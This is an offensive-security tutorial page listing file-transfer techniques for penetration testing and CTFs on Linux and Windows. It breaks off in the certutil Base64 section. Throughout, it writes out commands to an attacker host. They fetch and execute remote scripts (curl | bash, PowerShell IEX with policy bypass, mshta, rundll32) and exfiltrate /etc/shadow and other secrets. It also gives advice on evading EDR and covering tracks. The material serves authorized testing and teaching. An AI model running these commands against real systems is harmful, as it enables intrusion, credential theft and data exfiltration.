---
title: File Transfers
description: Comprehensive file transfer techniques for moving payloads, tools, and data between attacker and target machines during engagements.
navigation:
  icon: i-lucide-file-up
  title: File Transfers
---

Transferring files between machines is a critical skill during penetration testing, red team operations, and CTF challenges. This guide covers **every major technique** for uploading and downloading files across Linux and Windows targets using built-in tools, living-off-the-land binaries (LOLBins), and common utilities.

::warning
These techniques are intended for **authorized security testing** and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper written authorization before conducting any penetration testing activities.
::

## Quick Reference

| Method | OS | Direction | Detection Risk | Requires |
| ------ | -- | --------- | -------------- | -------- |
| `python3 -m http.server` | Linux | Serve | Low | Python |
| `wget` | Linux | Download | Low | wget |
| `curl` | Linux/Win | Download/Upload | Low | curl |
| `certutil` | Windows | Download | **High** | Built-in |
| `PowerShell IWR` | Windows | Download | Medium | PowerShell |
| `PowerShell IEX` | Windows | Download + Exec | **High** | PowerShell |
| `scp` | Linux | Both | Low | SSH |
| `nc` (Netcat) | Both | Both | Low | Netcat |
| `SMB` | Windows | Both | Low | Impacket |
| `Base64` | Both | Both | Low | Built-in |
| `PHP` | Linux | Download | Low | PHP |
| `FTP` | Both | Both | Low | FTP client |
| `tftp` | Windows | Download | Low | Built-in |
| `bitsadmin` | Windows | Download | **High** | Built-in |
| `mshta` | Windows | Download + Exec | **High** | Built-in |

---

## :icon{name="i-lucide-monitor"} Attacker — Hosting Files

Before transferring files to a target, you need to **serve** them from your attacker machine. These are the most common methods to host files.

### Python HTTP Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Serving" color="blue"}
  :badge{label="HTTP" color="orange"}
  :badge{label="Quick Setup" color="purple"}
::

The fastest way to serve files. Python is pre-installed on most Linux distributions and Kali Linux.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python 3"}
  ```bash [Terminal]
  # Serve current directory on port 80
  python3 -m http.server 80

  # Serve on custom port
  python3 -m http.server 8443

  # Serve specific directory
  python3 -m http.server 80 --directory /opt/payloads

  # Bind to specific interface
  python3 -m http.server 80 --bind 10.10.14.5
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python 2"}
  ```bash [Terminal]
  # Python 2 (legacy systems)
  python -m SimpleHTTPServer 80

  # Custom port
  python -m SimpleHTTPServer 8080
  ```
  :::
::

::tip
Always use **port 80 or 443** when possible — these ports are commonly allowed through firewalls and less likely to trigger alerts.
::

---

### PHP Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Serving" color="blue"}
  :badge{label="HTTP" color="orange"}
  :badge{label="Upload Support" color="red"}
::

PHP's built-in development server supports file serving and can be extended to handle **file uploads** with a simple script.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Serve Files"}
  ```bash [Terminal]
  # Serve current directory
  php -S 0.0.0.0:80

  # Serve specific directory
  php -S 0.0.0.0:8080 -t /opt/payloads
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Upload Server"}
  ```php [upload.php]
  <?php
  $uploadDirectory = '/tmp/uploads/';

  if (!is_dir($uploadDirectory)) {
      mkdir($uploadDirectory, 0755, true);
  }

  $fileName = basename($_FILES['file']['name']);
  $targetFile = $uploadDirectory . $fileName;

  if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
      echo "[+] File uploaded: " . $fileName . "\n";
  } else {
      echo "[-] Upload failed.\n";
  }
  ?>
  ```

  ```bash [Terminal]
  # Start PHP upload server
  php -S 0.0.0.0:80

  # Upload from target (Linux)
  curl -X POST http://10.10.14.5/upload.php -F "file=@/etc/passwd"

  # Upload from target (PowerShell)
  # Invoke-RestMethod -Uri http://10.10.14.5/upload.php -Method Post -InFile C:\data.txt
  ```
  :::
::

---

### Ruby / Busybox Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Serving" color="blue"}
  :badge{label="Alternatives" color="purple"}
::

```bash [Terminal]
# Ruby HTTP server
ruby -run -e httpd . -p 80

# Busybox HTTP server (minimal environments)
busybox httpd -f -p 80 -h /opt/payloads
```

---

### Netcat Listener (Raw)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Windows" color="blue"}
  :badge{label="Raw TCP" color="orange"}
  :badge{label="No Protocol" color="red"}
::

Serve a single file over raw TCP — no HTTP protocol overhead. Useful when the target has limited tools.

```bash [Terminal]
# Serve a file (sender closes after transfer)
nc -lvnp 443 < linpeas.sh

# Serve with ncat (keeps listening for multiple connections)
ncat --send-only -lvnp 443 < linpeas.sh
```

---

### Nginx / Apache Quick Config

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Persistent" color="blue"}
  :badge{label="HTTP/HTTPS" color="orange"}
  :badge{label="WebDAV" color="red"}
::

For persistent file hosting during long engagements, configure a proper web server with optional **WebDAV** for bidirectional transfers.

::code-collapse

```bash [Terminal]
# Quick Nginx setup on Kali
sudo mkdir -p /var/www/payloads
sudo cp /opt/tools/* /var/www/payloads/

# Create Nginx config
sudo tee /etc/nginx/sites-available/payloads << 'EOF'
server {
    listen 80;
    server_name _;

    # File Downloads
    location /dl/ {
        alias /var/www/payloads/;
        autoindex on;
    }

    # WebDAV Uploads
    location /upload/ {
        alias /var/www/uploads/;
        dav_methods PUT DELETE MKCOL COPY MOVE;
        create_full_put_path on;
        dav_access user:rw group:rw all:r;
        client_max_body_size 100M;
    }
}
EOF

sudo ln -s /etc/nginx/sites-available/payloads /etc/nginx/sites-enabled/
sudo mkdir -p /var/www/uploads
sudo chown www-data:www-data /var/www/uploads
sudo nginx -t && sudo systemctl restart nginx
```

::

---

### SMB Server (Impacket)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux → Windows" color="green"}
  :badge{label="SMB" color="blue"}
  :badge{label="Impacket" color="orange"}
  :badge{label="No Download Required" color="red"}
::

SMB is the **best method for Windows targets** — files can be accessed directly from the UNC path without downloading, or copied using built-in commands.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Without Auth"}
  ```bash [Terminal]
  # Basic SMB share (may be blocked by Windows 10+ default policy)
  impacket-smbserver share /opt/payloads -smb2support
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="With Auth"}
  ```bash [Terminal]
  # SMB share with authentication (required for modern Windows)
  impacket-smbserver share /opt/payloads -smb2support -user hacker -password hacker123
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Target (Windows)"}
  ```powershell [cmd.exe]
  :: Connect to share with credentials
  net use Z: \\10.10.14.5\share /user:hacker hacker123

  :: Copy file from share
  copy \\10.10.14.5\share\nc.exe C:\Windows\Temp\nc.exe

  :: Execute directly from share (no copy needed!)
  \\10.10.14.5\share\mimikatz.exe

  :: Copy file TO share (exfiltration)
  copy C:\Users\admin\Desktop\secrets.txt \\10.10.14.5\share\

  :: Disconnect
  net use Z: /delete
  ```
  :::
::

::tip
Use SMB with authentication to avoid **"You can't access this shared folder because your organization's security policies block unauthenticated guest access"** errors on Windows 10/11.
::

---

### FTP Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Both" color="green"}
  :badge{label="FTP" color="blue"}
  :badge{label="Upload + Download" color="orange"}
  :badge{label="pyftpdlib" color="purple"}
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Attacker Setup"}
  ```bash [Terminal]
  # Install pyftpdlib
  pip3 install pyftpdlib

  # Anonymous FTP (download only)
  python3 -m pyftpdlib -p 21 -d /opt/payloads

  # FTP with write access (upload enabled)
  python3 -m pyftpdlib -p 21 -d /opt/payloads -w

  # FTP with authentication
  python3 -m pyftpdlib -p 21 -u ftpuser -P ftppass -d /opt/payloads -w
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Target Download"}
  ```bash [Terminal]
  # Linux - interactive FTP
  ftp 10.10.14.5
  # > anonymous / (blank password)
  # > binary
  # > get payload.exe
  # > bye

  # Linux - one-liner
  wget ftp://10.10.14.5/payload.exe
  curl ftp://10.10.14.5/payload.exe -o payload.exe
  ```

  ```powershell [cmd.exe]
  :: Windows - FTP script method
  echo open 10.10.14.5 > ftp_commands.txt
  echo anonymous >> ftp_commands.txt
  echo binary >> ftp_commands.txt
  echo get payload.exe >> ftp_commands.txt
  echo bye >> ftp_commands.txt
  ftp -s:ftp_commands.txt
  ```
  :::
::

---

### TFTP Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux → Windows" color="green"}
  :badge{label="UDP" color="blue"}
  :badge{label="Simple" color="orange"}
  :badge{label="Legacy" color="red"}
::

TFTP (Trivial File Transfer Protocol) is useful for older Windows systems and embedded devices. It uses **UDP port 69** and requires no authentication.

```bash [Terminal]
# Install atftpd
sudo apt install atftpd -y

# Start TFTP server
sudo atftpd --daemon --port 69 /opt/payloads

# Alternative: Python TFTP
pip3 install ptftpd
ptftpd -p 69 -r /opt/payloads eth0
```

```powershell [Target — Windows]
:: Download via TFTP (Windows)
tftp -i 10.10.14.5 GET payload.exe

:: Upload via TFTP
tftp -i 10.10.14.5 PUT C:\Windows\Temp\loot.txt
```

::note
TFTP client is **not enabled by default** on modern Windows. It can be enabled via: `dism /online /Enable-Feature /FeatureName:TFTP`
::

---

### WebDAV Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Both" color="green"}
  :badge{label="HTTP/WebDAV" color="blue"}
  :badge{label="Bidirectional" color="orange"}
  :badge{label="wsgidav" color="purple"}
::

WebDAV extends HTTP to allow file management operations. It's natively supported by Windows Explorer.

```bash [Terminal]
# Install wsgidav
pip3 install wsgidav

# Start WebDAV server (anonymous, read-write)
wsgidav --host 0.0.0.0 --port 80 --root /opt/payloads --auth anonymous
```

```powershell [Target — Windows]
:: Mount WebDAV as network drive
net use W: http://10.10.14.5/ /user: ""

:: Copy from WebDAV
copy W:\payload.exe C:\Windows\Temp\

:: Direct execution
\\10.10.14.5\DavWWWRoot\payload.exe
```

---

## :icon{name="i-lucide-download"} Linux Target — Download Methods

### wget

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="HTTP/HTTPS/FTP" color="orange"}
  :badge{label="Most Common" color="red"}
::

`wget` is the most reliable download tool, available on nearly all Linux systems. It supports HTTP, HTTPS, and FTP with resume capability.

```bash [Terminal]
# Basic download
wget http://10.10.14.5/linpeas.sh

# Save with custom name
wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh

# Silent download
wget http://10.10.14.5/linpeas.sh -q -O /tmp/lp.sh

# Download and execute (no file on disk)
wget http://10.10.14.5/linpeas.sh -q -O - | bash

# Download with authentication
wget --user=admin --password=secret http://10.10.14.5/payload.elf

# Ignore SSL certificate errors
wget --no-check-certificate https://10.10.14.5/payload.elf

# Recursive download (mirror site)
wget -r -np http://10.10.14.5/tools/

# Download with custom User-Agent (evasion)
wget -U "Mozilla/5.0 (X11; Linux x86_64)" http://10.10.14.5/payload.elf

# Resume interrupted download
wget -c http://10.10.14.5/large_file.tar.gz
```

::caution
`wget -O - | bash` downloads and executes code **directly in memory** without writing to disk. While stealthy, it's dangerous — always verify the script content first.
::

---

### curl

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Windows" color="blue"}
  :badge{label="Download + Upload" color="orange"}
  :badge{label="Versatile" color="red"}
  :badge{label="HTTP/S/FTP/SCP" color="purple"}
::

`curl` is extremely versatile, supporting dozens of protocols and available on both Linux and modern Windows.

::tabs
  :::tabs-item{icon="i-lucide-download" label="Download"}
  ```bash [Terminal]
  # Basic download (output to stdout)
  curl http://10.10.14.5/linpeas.sh

  # Save to file
  curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

  # Save with remote filename
  curl -O http://10.10.14.5/linpeas.sh

  # Silent download
  curl -s http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

  # Download and execute
  curl http://10.10.14.5/linpeas.sh | bash

  # Pipe to sh with arguments
  curl -s http://10.10.14.5/script.sh | bash -s -- --arg1 --arg2

  # Follow redirects
  curl -L http://10.10.14.5/payload -o payload

  # Ignore SSL errors
  curl -k https://10.10.14.5/payload.elf -o payload.elf

  # Custom headers
  curl -H "Authorization: Bearer token123" http://10.10.14.5/secret.txt

  # Download with authentication
  curl -u admin:password http://10.10.14.5/payload.elf -o payload.elf
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Upload"}
  ```bash [Terminal]
  # Upload file via POST
  curl -X POST http://10.10.14.5/upload -F "file=@/etc/passwd"

  # Upload via PUT
  curl -T /etc/shadow http://10.10.14.5/upload/shadow

  # Upload to WebDAV
  curl -T loot.tar.gz http://10.10.14.5/upload/loot.tar.gz

  # Upload with authentication
  curl -u admin:pass -T data.txt ftp://10.10.14.5/data.txt

  # Upload raw data
  curl -X POST -d @/etc/passwd http://10.10.14.5/exfil
  ```
  :::
::

---

### Netcat / Ncat

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Both Directions" color="blue"}
  :badge{label="Raw TCP" color="orange"}
  :badge{label="No Protocol" color="red"}
::

Transfer files over raw TCP connections without any protocol overhead. Useful when HTTP tools are unavailable.

::tabs
  :::tabs-item{icon="i-lucide-download" label="Download to Target"}
  ```bash [Attacker]
  # Method 1: Attacker sends, target receives
  # Attacker (sender):
  nc -lvnp 443 < payload.elf

  # Target (receiver):
  nc 10.10.14.5 443 > payload.elf
  ```

  ```bash [Alternative]
  # Method 2: Target listens, attacker pushes
  # Target (listener):
  nc -lvnp 4444 > payload.elf

  # Attacker (pusher):
  nc 10.10.16.50 4444 < payload.elf
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Upload from Target"}
  ```bash [Attacker]
  # Attacker listens for incoming file
  nc -lvnp 443 > loot.tar.gz

  # Target sends file
  nc 10.10.14.5 443 < /tmp/loot.tar.gz

  # Alternative: cat + pipe
  cat /etc/shadow | nc 10.10.14.5 443
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="With Ncat (SSL)"}
  ```bash [Terminal]
  # Encrypted transfer using ncat (from Nmap suite)
  # Attacker:
  ncat --ssl -lvnp 443 > received_file.txt

  # Target:
  ncat --ssl 10.10.14.5 443 < /etc/shadow
  ```
  :::
::

::note
Netcat transfers have **no progress indicator** and no built-in integrity checking. Use `md5sum` on both ends to verify file integrity after transfer.
::

---

### SCP / SSH

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Both Directions" color="blue"}
  :badge{label="Encrypted" color="orange"}
  :badge{label="SSH Required" color="red"}
::

Secure copy over SSH — the most reliable encrypted transfer method when SSH access is available.

```bash [Terminal]
# Download file FROM target
scp user@target:/etc/passwd ./passwd_copy

# Upload file TO target
scp linpeas.sh user@target:/tmp/linpeas.sh

# Recursive directory copy
scp -r ./tools/ user@target:/tmp/tools/

# Custom SSH port
scp -P 2222 payload.elf user@target:/tmp/

# Using SSH key
scp -i id_rsa linpeas.sh user@target:/tmp/

# SFTP interactive session
sftp user@target
# sftp> put linpeas.sh /tmp/
# sftp> get /etc/shadow ./
# sftp> bye
```

---

### /dev/tcp (Bash Built-in)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="No External Tools" color="orange"}
  :badge{label="Bash Only" color="red"}
::

When `wget`, `curl`, and `nc` are all unavailable, Bash's built-in `/dev/tcp` pseudo-device can make TCP connections.

```bash [Terminal]
# Download file using /dev/tcp
cat < /dev/tcp/10.10.14.5/80 > payload.elf

# Full HTTP request via /dev/tcp
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /linpeas.sh HTTP/1.1\r\nHost: 10.10.14.5\r\nConnection: close\r\n\r\n" >&3
cat <&3 > linpeas.sh
exec 3>&-

# Alternative: redirect to file
bash -c 'cat < /dev/tcp/10.10.14.5/443 > /tmp/payload.elf'
```

::warning
`/dev/tcp` is a **Bash-specific feature** — it won't work in `sh`, `dash`, `zsh`, or other shells. Verify the shell with `echo $0` or `echo $SHELL`.
::

---

### Scripting Language One-Liners

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="Python/Perl/Ruby" color="orange"}
  :badge{label="LOLBins" color="purple"}
::

When standard download tools are removed or blocked, scripting languages often remain available.

::code-collapse

```bash [Terminal]
# ──── Python 3 ────
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh")'

# Python 3 - download and execute
python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://10.10.14.5/payload.py").read())'

# ──── Python 2 ────
python -c 'import urllib; urllib.urlretrieve("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh")'

# ──── Perl ────
perl -e 'use LWP::Simple; getstore("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh")'

# Perl (alternative - no LWP)
perl -MHTTP::Tiny -e '$r=HTTP::Tiny->new->get("http://10.10.14.5/linpeas.sh"); open(F,">/tmp/linpeas.sh"); print F $r->{content}'

# ──── Ruby ────
ruby -e 'require "net/http"; File.write("/tmp/linpeas.sh", Net::HTTP.get(URI("http://10.10.14.5/linpeas.sh")))'

# ──── PHP ────
php -r 'file_put_contents("/tmp/linpeas.sh", file_get_contents("http://10.10.14.5/linpeas.sh"));'

# PHP exec (no file on disk)
php -r 'system(file_get_contents("http://10.10.14.5/cmd.sh"));'

# ──── Node.js ────
node -e 'require("https").get("http://10.10.14.5/linpeas.sh", r => { let d=""; r.on("data",c=>d+=c); r.on("end",()=>require("fs").writeFileSync("/tmp/linpeas.sh",d)) })'

# ──── Lua ────
lua -e 'local h=require("socket.http"); local b=h.request("http://10.10.14.5/payload"); local f=io.open("/tmp/payload","w"); f:write(b); f:close()'

# ──── awk ────
awk 'BEGIN{
  s="/inet/tcp/0/10.10.14.5/80"
  print "GET /linpeas.sh" |& s
  while((s |& getline line) > 0) print line > "/tmp/linpeas.sh"
  close(s)
}'
```

::

---

### openssl

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="Encrypted" color="orange"}
  :badge{label="Built-in" color="red"}
::

`openssl` can be used as a network client for encrypted file transfers when other tools are unavailable.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Attacker"}
  ```bash [Terminal]
  # Generate self-signed cert
  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem -subj '/CN=test'

  # Start SSL server serving a file
  openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < /opt/payloads/linpeas.sh
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Target"}
  ```bash [Terminal]
  # Download from SSL server
  openssl s_client -quiet -connect 10.10.14.5:443 > /tmp/linpeas.sh
  ```
  :::
::

---

## :icon{name="i-lucide-monitor-smartphone"} Windows Target — Download Methods

### PowerShell

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="HTTP/HTTPS" color="orange"}
  :badge{label="Most Common" color="red"}
  :badge{label="Monitored" color="purple"}
::

PowerShell is the **primary file transfer tool** on modern Windows systems. Multiple cmdlets and .NET classes are available.

::tabs
  :::tabs-item{icon="i-lucide-download" label="Download to Disk"}
  ```powershell [PowerShell]
  # ──── Invoke-WebRequest (IWR) ────
  Invoke-WebRequest -Uri http://10.10.14.5/winPEAS.exe -OutFile C:\Windows\Temp\wp.exe

  # Short alias
  iwr http://10.10.14.5/winPEAS.exe -o C:\Windows\Temp\wp.exe

  # Ignore SSL errors
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  iwr https://10.10.14.5/payload.exe -o C:\Windows\Temp\payload.exe

  # ──── wget / curl aliases (PowerShell 5+) ────
  wget http://10.10.14.5/nc.exe -OutFile nc.exe
  curl http://10.10.14.5/nc.exe -OutFile nc.exe

  # ──── System.Net.WebClient ────
  (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/winPEAS.exe','C:\Windows\Temp\wp.exe')

  # Short form
  $wc = New-Object Net.WebClient
  $wc.DownloadFile('http://10.10.14.5/payload.exe','C:\Temp\payload.exe')

  # With proxy support
  $wc = New-Object Net.WebClient
  $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
  $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
  $wc.DownloadFile('http://10.10.14.5/payload.exe','C:\Temp\payload.exe')
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="Download + Execute (Fileless)"}
  ```powershell [PowerShell]
  # ──── Invoke-Expression (IEX) — Execute in memory ────
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')

  # IEX with IWR
  IEX (iwr http://10.10.14.5/PowerView.ps1 -UseBasicParsing).Content

  # Pipeline execution
  (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1') | IEX

  # ──── Bypass execution policy ────
  powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')"

  # From cmd.exe
  powershell -ep bypass -c "IEX (iwr http://10.10.14.5/script.ps1 -UseBasicParsing)"

  # ──── Encoded command (base64 obfuscation) ────
  # Generate on attacker:
  # echo -n "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')" | iconv -t UTF-16LE | base64 -w0
  powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA...
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Upload"}
  ```powershell [PowerShell]
  # Upload file via POST
  Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -InFile C:\Users\admin\secrets.txt

  # Upload via WebClient
  (New-Object Net.WebClient).UploadFile('http://10.10.14.5/upload','C:\data.txt')

  # Upload string data
  (New-Object Net.WebClient).UploadString('http://10.10.14.5/exfil', (Get-Content C:\flag.txt))

  # Upload via Invoke-RestMethod
  Invoke-RestMethod -Uri http://10.10.14.5/upload.php -Method Post -InFile C:\loot.zip
  ```
  :::
::

::caution
`Invoke-Expression` (IEX) and `DownloadString` are heavily monitored by **AMSI** (Antimalware Scan Interface), **Windows Defender**, and **EDR solutions**. Use obfuscation or alternative methods in hardened environments.
::

---

### certutil

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="LOLBin" color="orange"}
  :badge{label="Built-in" color="red"}
  :badge{label="Highly Detected" color="purple"}
::

`certutil.exe` is a built-in Windows certificate management tool that can be abused for file downloads and Base64 encoding/decoding. It's available on **all Windows versions** from XP onwards.

```powershell [cmd.exe]
:: Basic download
certutil -urlcache -split -f http://10.10.14.5/winPEAS.exe C:\Windows\Temp\wp.exe

:: Download and verify hash
certutil -urlcache -split -f http://10.10.14.5/payload.exe payload.exe
certutil -hashfile payload.exe MD5

:: Base64 decode (for encoded transfers)
certutil -decode encoded.b64 payload.exe

:: Base64 encode (for exfiltration)
certutil -encode C:\Users\admin\secrets.txt encoded.b64

:: Clear URL cache (clean tracks)
certutil -urlcache -split -f http://10.10.14.5/payload.exe delete
```

::warning
`certutil` for downloading files triggers **high-confidence alerts** in most security tools. Windows Defender, CrowdStrike, Carbon Black, and SentinelOne all flag this technique. Use alternatives when stealth is required.
::

---

### bitsadmin

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="LOLBin" color="orange"}
  :badge{label="Background Transfer" color="red"}
  :badge{label="Built-in" color="purple"}
::

`bitsadmin` manages the Background Intelligent Transfer Service (BITS) — the same service Windows Update uses. Downloads are performed asynchronously and can survive reboots.

```powershell [cmd.exe]
:: Simple download
bitsadmin /transfer job1 /download /priority high http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe

:: PowerShell BITS cmdlet (preferred)
Start-BitsTransfer -Source http://10.10.14.5/payload.exe -Destination C:\Windows\Temp\payload.exe

:: Asynchronous download (background)
Start-BitsTransfer -Source http://10.10.14.5/payload.exe -Destination C:\Temp\payload.exe -Asynchronous
```

---

### mshta

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download + Execute" color="green"}
  :badge{label="LOLBin" color="orange"}
  :badge{label="HTA" color="red"}
  :badge{label="Highly Detected" color="purple"}
::

`mshta.exe` executes Microsoft HTML Applications (HTA) and can download and execute code from remote URLs.

```powershell [cmd.exe]
:: Execute remote HTA
mshta http://10.10.14.5/payload.hta

:: Execute VBScript via mshta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX (iwr http://10.10.14.5/shell.ps1)"", 0:close")

:: Execute JavaScript via mshta
mshta javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("powershell -ep bypass -c IEX(iwr http://10.10.14.5/s.ps1)");close();
```

---

### rundll32

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download + Execute" color="green"}
  :badge{label="LOLBin" color="orange"}
  :badge{label="DLL Loading" color="red"}
::

```powershell [cmd.exe]
:: Download and execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX (iwr http://10.10.14.5/shell.ps1)")

:: Load remote DLL via SMB
rundll32.exe \\10.10.14.5\share\payload.dll,EntryPoint
```

---

### cscript / wscript

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="VBScript" color="orange"}
  :badge{label="LOLBin" color="red"}
::

When PowerShell is blocked, VBScript can download files using `MSXML2.XMLHTTP` and `ADODB.Stream` objects.

::code-collapse

```vbscript [download.vbs]
' Save as download.vbs and run: cscript download.vbs
Dim xHttp: Set xHttp = CreateObject("MSXML2.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")

xHttp.Open "GET", "http://10.10.14.5/payload.exe", False
xHttp.Send

With bStrm
    .Type = 1 'binary
    .Open
    .Write xHttp.responseBody
    .SaveToFile "C:\Windows\Temp\payload.exe", 2
End With

WScript.Echo "Download complete!"
```

::

```powershell [cmd.exe]
:: Execute the download script
cscript //nologo download.vbs

:: One-liner (echo script to file, then execute)
echo Set o=CreateObject("MSXML2.XMLHTTP"):o.Open "GET","http://10.10.14.5/nc.exe",False:o.Send:Set s=CreateObject("Adodb.Stream"):s.Type=1:s.Open:s.Write o.responseBody:s.SaveToFile "C:\Temp\nc.exe",2 > dl.vbs & cscript //nologo dl.vbs
```

---

### Windows curl.exe

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows 10+" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="Built-in" color="orange"}
  :badge{label="Less Detected" color="red"}
::

Windows 10 (1803+) and Windows Server 2019+ include a **native curl.exe** binary. Note: use `curl.exe` (not `curl`) to avoid the PowerShell alias.

```powershell [cmd.exe]
:: Download file (use curl.exe to avoid PowerShell alias)
curl.exe http://10.10.14.5/payload.exe -o C:\Windows\Temp\payload.exe

:: Silent download
curl.exe -s http://10.10.14.5/payload.exe -o payload.exe

:: Ignore SSL
curl.exe -k https://10.10.14.5/payload.exe -o payload.exe

:: Upload file
curl.exe -X POST -F "file=@C:\Users\admin\secrets.txt" http://10.10.14.5/upload
```

::tip
`curl.exe` is **less monitored** than `certutil` or `PowerShell IEX` by most EDR solutions, making it a good alternative for file transfers on modern Windows.
::

---

## :icon{name="i-lucide-binary"} Base64 Encoded Transfers

When network transfers are restricted or monitored, encoding files as Base64 text allows transfer through **copy-paste**, **echo commands**, or **DNS/ICMP channels**.

### Linux Base64

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Encoding" color="blue"}
  :badge{label="No Network" color="orange"}
  :badge{label="Copy-Paste" color="red"}
::

```bash [Terminal]
# ──── On Attacker: Encode file ────
base64 -w0 payload.elf
# Output: f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... (copy this)

# Encode and copy to clipboard (if xclip available)
base64 -w0 payload.elf | xclip -selection clipboard

# Check MD5 before transfer
md5sum payload.elf

# ──── On Target: Decode file ────
echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA..." | base64 -d > payload.elf
chmod +x payload.elf

# Verify integrity
md5sum payload.elf
```

---

### Windows Base64

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Encoding" color="green"}
  :badge{label="certutil" color="orange"}
  :badge{label="PowerShell" color="red"}
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="PowerShell Method"}
  ```powershell [PowerShell]
  # ──── Encode on Attacker (Linux) ────
  # For PowerShell transfer, use UTF-16LE encoding:
  cat payload.exe | base64 -w0 ; echo

  # ──── Decode on Target (PowerShell) ────
  $base64 = "TVqQAAMAAAAEAAAA//8AALgAAAA..."
  [IO.File]::WriteAllBytes("C:\Windows\Temp\payload.exe", [Convert]::FromBase64String($base64))

  # Alternative: Set-Content
  $bytes = [Convert]::FromBase64String("TVqQAAMAAAAEAAAA...")
  Set-Content -Path "C:\Temp\payload.exe" -Value $bytes -Encoding Byte
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="certutil Method"}
  ```powershell [cmd.exe]
  :: Step 1: Create encoded file on target (paste base64 content)
  echo TVqQAAMAAAAEAAAA//8AALgAAAA... > encoded.b64

  :: Step 2: Decode with certutil
  certutil -decode encoded.b64 payload.exe

  :: Step 3: Verify
